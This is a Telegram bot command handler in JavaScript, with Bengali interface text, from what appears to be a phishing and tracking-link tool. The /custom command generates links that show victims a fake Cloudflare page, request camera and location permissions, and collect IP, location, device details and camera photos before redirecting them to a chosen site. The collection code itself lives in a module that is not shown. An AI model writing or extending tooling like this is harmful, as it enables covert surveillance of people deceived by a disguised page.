const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');
const helpers = require('../utils/helpers');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) {
      return bot.sendMessage(chatId, 'Access denied. Use /start first and wait for approval.');
    }
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) {
      return bot.sendMessage(chatId, 'Rate limit exceeded. Try again in a minute.');
    }
    
    // URL এক্সট্রাক্ট
    const urlMatch = text.match(/\/custom\s+(https?:\/\/[^\s]+)/);
    if (!urlMatch) {
      return bot.sendMessage(chatId,
        `🎯 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐄𝐃𝐈𝐑𝐄𝐂𝐓 𝐋𝐈𝐍𝐊\n\n` +
        `📝 ব্যবহার: /custom https://targetsite.com\n\n` +
        `⚡ ফ্লো:\n` +
        `1️⃣ ইউজার লিঙ্কে ক্লিক করবে\n` +
        `2️⃣ ক্লাউডফ্লেয়ার পেজ দেখবে\n` +
        `3️⃣ পারমিশন নিবে\n` +
        `4️⃣ ডাটা কালেক্ট করবে\n` +
        `5️⃣ টার্গেট সাইটে রিডাইরেক্ট করবে`
      );
    }
    
    const targetUrl = urlMatch[1];
    const link = await generator.generateCustomLink(userId, targetUrl);
    
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    const message = `✅ 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐄𝐃𝐈𝐑𝐄𝐂𝐓 𝐋𝐈𝐍𝐊\n\n` +
      `🔗 আপনার লিঙ্ক:\n${link.url}\n\n` +
      `🎯 টার্গেট: ${targetUrl}\n\n` +
      `📊 কালেক্টেড ডাটা:\n` +
      `• আইপি ও লোকেশন\n` +
      `• ডিভাইস ইনফো\n` +
      `• ক্যামেরা ফটো (পারমিশন দিলে)\n` +
      `• লোকেশন (পারমিশন দিলে)\n\n` +
      `⏰ এক্সপায়ার: ৭ দিন`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('Custom Command Error:', error);
    await bot.sendMessage(chatId, '❌ এরর হয়েছে।');
  }
};
